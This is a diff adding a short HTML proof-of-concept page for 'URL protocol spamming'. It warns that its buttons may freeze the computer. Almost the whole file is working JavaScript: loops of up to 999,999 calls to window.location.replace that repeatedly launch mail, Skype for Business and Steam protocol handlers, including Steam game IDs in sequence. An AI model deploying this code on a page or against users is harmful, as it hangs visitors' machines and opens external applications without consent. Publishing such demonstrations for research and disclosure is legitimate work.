@@ -1,0 +1,28 @@
+<p>URL Protocol Spamming - Proof of Concept</p>
+
+<b>Warning</b>: Clicking the buttons below may hang or freeze your computer. They will continuously redirect the page, using URL protocols to open external applications.</br></br>
+
+<button onclick="spamMailto()">Spam Mailto</button><br/>
+<button onclick="spamSkypeMeetingsApp()">Spam Skype Meetings App</button><br/>
+<button onclick="spamSteam()">Spam Steam</button><br/>
+
+<script>
+function spamMailto() {
+  for (var i = 1; i <= 999999; i++) {
+    window.location.replace("mailto:user@example.com");
+  }
+}
+
+function spamSkypeMeetingsApp() {
+  for (var i = 1; i <= 999999; i++) {
+    window.location.replace("sfb:https://www.microsoft.com/");
+  }
+}
+
+function spamSteam() {
+  for (var i = 1; i <= 999999; i++) {
+    window.location.replace("steam://run/" + i);
+    window.location.replace("steam://openurl/https://www.origin.com/usa/en-us/store");
+  }
+}
+</script>
